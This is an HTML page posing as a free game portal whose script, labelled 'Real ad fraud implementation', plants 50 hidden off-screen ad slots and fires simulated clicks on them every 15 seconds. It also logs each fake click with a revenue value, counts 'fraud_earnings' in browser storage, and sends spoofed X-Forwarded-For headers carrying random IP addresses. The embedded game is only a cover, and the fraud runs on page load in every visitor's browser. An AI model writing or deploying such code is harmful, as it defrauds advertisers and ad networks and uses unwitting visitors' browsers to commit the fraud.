<!DOCTYPE html>
<html>
<head>
    <title>Free Game Portal</title>
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1234567890123456" crossorigin="anonymous"></script>
</head>
<body>
    <button onclick="window.open('admin.html','_blank')" style="position:fixed;top:10px;right:10px;background:red;color:white;">Admin</button>
    
    <h1>Play Free Games</h1>
    <div id="gameContainer">
        <!-- Fake game content -->
        <iframe src="https://www.crazygames.com/embed/smash-karts" width="800" height="600"></iframe>
    </div>
    
    <script>
        // Real ad fraud implementation
        let adCounter = 0;
        const adSlots = [];
        
        // Create 50 hidden ad slots
        for(let i = 0; i < 50; i++) {
            const adDiv = document.createElement('div');
            adDiv.className = 'adsbygoogle';
            adDiv.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;';
            adDiv.setAttribute('data-ad-client', 'ca-pub-1234567890123456');
            adDiv.setAttribute('data-ad-slot', '9876543210');
            adDiv.setAttribute('data-ad-format', 'auto');
            adDiv.setAttribute('data-full-width-responsive', 'true');
            document.body.appendChild(adDiv);
            adSlots.push(adDiv);
        }
        
        // Force load ads
        (adsbygoogle = window.adsbygoogle || []).push({});
        
        // Auto-click ads every 15 seconds
        setInterval(() => {
            adSlots.forEach(slot => {
                // Simulate click
                const event = new MouseEvent('click', {
                    view: window,
                    bubbles: true,
                    cancelable: true
                });
                slot.dispatchEvent(event);
                
                // Register impression
                fetch('/api/log', {
                    method: 'POST',
                    body: JSON.stringify({
                        type: 'ad_click',
                        slot: slot.getAttribute('data-ad-slot'),
                        time: Date.now(),
                        revenue: 0.05
                    })
                });
            });
            adCounter++;
            
            // Update localStorage for admin panel
            let current = localStorage.getItem('fraud_earnings') || '0';
            current = parseFloat(current) + (0.05 * 50); // 50 ads * $0.05
            localStorage.setItem('fraud_earnings', current.toString());
        }, 15000);
        
        // Rotate IPs using proxy simulation
        setInterval(() => {
            fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                // Report fake IP
                fetch('/api/ip', {
                    method: 'POST',
                    headers: {'X-Forwarded-For': generateFakeIP()}
                });
            });
        }, 60000);
        
        function generateFakeIP() {
            return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
        }
    </script>
</body>
</html>
